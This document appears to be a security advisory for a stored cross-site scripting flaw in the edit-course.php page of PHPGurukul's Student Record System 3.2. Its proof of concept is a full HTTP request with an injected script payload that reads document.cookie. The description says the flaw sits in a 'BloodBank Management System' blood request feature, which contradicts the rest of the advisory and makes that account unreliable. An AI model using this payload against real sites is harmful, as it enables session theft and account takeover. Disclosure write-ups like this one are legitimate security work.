## Manager System XSS From Student Record Management System

**Affected Project**: Student Record System 3.2

**Official Website**: https://phpgurukul.com/student-record-system-php/

## Vulnerability Information
- **Vulnerability Type**: Stored Cross-Site Scripting (XSS)
- **Severity**: HIGH

**Related Code File**: edit-course.php

**Injection Parametre**: course-full

## Vulnerability Description

A Stored Cross-Site Scripting (XSS) vulnerability was discovered in the blood request functionality of the BloodBank Management System. This flaw occurs because the `course-full` parameter is not properly sanitized before being rendered on the web page. This allows an attacker to inject malicious JavaScript code, which will be executed when the page is accessed.
Successful exploitation can lead to session hijacking, redirection to phishing sites, or unauthorized actions on behalf of the victim. Additionally, this could be exploited for social engineering attacks or to spread malware.

## Proof of Content(POC)

Below is what the `edit-course.php` POST request looks like:

```
POST /studentrecordms/edit-course.php?cid=11 HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 128
Origin: http://localhost
Connection: keep-alive
Referer: http://localhost/studentrecordms/edit-course.php?cid=11
Cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; continueCode=Wb351y8noRVw6yLkJ5Yxv7MObe2EAVqg0zKQljaNWpmXBZD4qP3gr91X6OkJ; PHPSESSID=e048o5plsma7fs12erv662c5fg; PHPSESSID=3ravfm034ns8lmfhr96bfmrdq8
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i

course-short=HELLO&course-full=%22%3E%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E&udate=29-10-2024&submit=Update+Course
```

When this request is executed, the following script will be injected into the page:
    ```"><script>alert(document.cookie)</script>```
This will trigger a JavaScript alert as a demonstration of the vulnerability.


![](https://github.com/Speecttre/Asset/blob/main/StudentRecordEDITCOURSESTOREDXSS.png)

- SourceCode

![](https://github.com/Speecttre/Asset/blob/main/StudentRecord-EditCourseSourceCode.png)